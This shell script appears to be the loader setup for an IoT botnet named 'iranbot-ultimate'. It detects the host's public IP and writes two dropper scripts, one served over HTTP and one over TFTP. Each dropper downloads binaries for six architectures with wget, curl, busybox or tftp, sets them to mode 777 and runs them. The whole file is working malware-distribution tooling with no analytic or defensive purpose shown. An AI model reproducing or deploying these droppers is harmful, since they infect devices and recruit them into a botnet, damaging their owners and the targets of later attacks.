#!/bin/sh

echo "HTTP Port (optional, press Enter for default 80):"
read PORT

if [ -z "$PORT" ]; then
    PORT="80"
fi

IP=$(curl -s ifconfig.co)

if [ "$PORT" = "80" ]; then
    BASE_URL="http://$IP"
else
    BASE_URL="http://$IP:$PORT"
fi

cat <<EOF >/var/www/html/cat.sh
#!/bin/sh
wget $BASE_URL/iranbot-ultimate.x86_64 -O iranbot-ultimate.x86_64 || curl $BASE_URL/iranbot-ultimate.x86_64 -o iranbot-ultimate.x86_64 || busybox wget $BASE_URL/iranbot-ultimate.x86_64 -O iranbot-ultimate.x86_64 || busybox curl $BASE_URL/iranbot-ultimate.x86_64 -o iranbot-ultimate.x86_64; chmod 777 iranbot-ultimate.x86_64; ./iranbot-ultimate.x86_64 "\$@";
wget $BASE_URL/iranbot-ultimate.aarch64 -O iranbot-ultimate.aarch64 || curl $BASE_URL/iranbot-ultimate.aarch64 -o iranbot-ultimate.aarch64 || busybox wget $BASE_URL/iranbot-ultimate.aarch64 -O iranbot-ultimate.aarch64 || busybox curl $BASE_URL/iranbot-ultimate.aarch64 -o iranbot-ultimate.aarch64; chmod 777 iranbot-ultimate.aarch64; ./iranbot-ultimate.aarch64 "\$@";
wget $BASE_URL/iranbot-ultimate.mips -O iranbot-ultimate.mips || curl $BASE_URL/iranbot-ultimate.mips -o iranbot-ultimate.mips || busybox wget $BASE_URL/iranbot-ultimate.mips -O iranbot-ultimate.mips || busybox curl $BASE_URL/iranbot-ultimate.mips -o iranbot-ultimate.mips; chmod 777 iranbot-ultimate.mips; ./iranbot-ultimate.mips "\$@";
wget $BASE_URL/iranbot-ultimate.mipsel -O iranbot-ultimate.mipsel || curl $BASE_URL/iranbot-ultimate.mipsel -o iranbot-ultimate.mipsel || busybox wget $BASE_URL/iranbot-ultimate.mipsel -O iranbot-ultimate.mipsel || busybox curl $BASE_URL/iranbot-ultimate.mipsel -o iranbot-ultimate.mipsel; chmod 777 iranbot-ultimate.mipsel; ./iranbot-ultimate.mipsel "\$@";
wget $BASE_URL/iranbot-ultimate.x86_32 -O iranbot-ultimate.x86_32 || curl $BASE_URL/iranbot-ultimate.x86_32 -o iranbot-ultimate.x86_32 || busybox wget $BASE_URL/iranbot-ultimate.x86_32 -O iranbot-ultimate.x86_32 || busybox curl $BASE_URL/iranbot-ultimate.x86_32 -o iranbot-ultimate.x86_32; chmod 777 iranbot-ultimate.x86_32; ./iranbot-ultimate.x86_32 "\$@";
wget $BASE_URL/iranbot-ultimate.armv4l -O iranbot-ultimate.armv4l || curl $BASE_URL/iranbot-ultimate.armv4l -o iranbot-ultimate.armv4l || busybox wget $BASE_URL/iranbot-ultimate.armv4l -O iranbot-ultimate.armv4l || busybox curl $BASE_URL/iranbot-ultimate.armv4l -o iranbot-ultimate.armv4l; chmod 777 iranbot-ultimate.armv4l; ./iranbot-ultimate.armv4l "\$@";
EOF

cat <<EOF >/srv/tftp/tftp.sh
#!/bin/sh
tftp $IP -g -r iranbot-ultimate.x86_64 -l iranbot-ultimate.x86_64 || busybox tftp $IP -g -r iranbot-ultimate.x86_64 -l iranbot-ultimate.x86_64; chmod 777 iranbot-ultimate.x86_64; ./iranbot-ultimate.x86_64 "\$@";
tftp $IP -g -r iranbot-ultimate.aarch64 -l iranbot-ultimate.aarch64 || busybox tftp $IP -g -r iranbot-ultimate.aarch64 -l iranbot-ultimate.aarch64; chmod 777 iranbot-ultimate.aarch64; ./iranbot-ultimate.aarch64 "\$@";
tftp $IP -g -r iranbot-ultimate.mips -l iranbot-ultimate.mips || busybox tftp $IP -g -r iranbot-ultimate.mips -l iranbot-ultimate.mips; chmod 777 iranbot-ultimate.mips; ./iranbot-ultimate.mips "\$@";
tftp $IP -g -r iranbot-ultimate.mipsel -l iranbot-ultimate.mipsel || busybox tftp $IP -g -r iranbot-ultimate.mipsel -l iranbot-ultimate.mipsel; chmod 777 iranbot-ultimate.mipsel; ./iranbot-ultimate.mipsel "\$@";
tftp $IP -g -r iranbot-ultimate.x86_32 -l iranbot-ultimate.x86_32 || busybox tftp $IP -g -r iranbot-ultimate.x86_32 -l iranbot-ultimate.x86_32; chmod 777 iranbot-ultimate.x86_32; ./iranbot-ultimate.x86_32 "\$@";
tftp $IP -g -r iranbot-ultimate.armv4l -l iranbot-ultimate.armv4l || busybox tftp $IP -g -r iranbot-ultimate.armv4l -l iranbot-ultimate.armv4l; chmod 777 iranbot-ultimate.armv4l; ./iranbot-ultimate.armv4l "\$@";
EOF

chmod 777 /var/www/html/cat.sh /srv/tftp/tftp.sh

echo "========================================"
echo "DONE!"
echo "HTTP script: http://$IP:$PORT/cat.sh"
echo "TFTP script: /srv/tftp/tftp.sh"
echo "========================================"
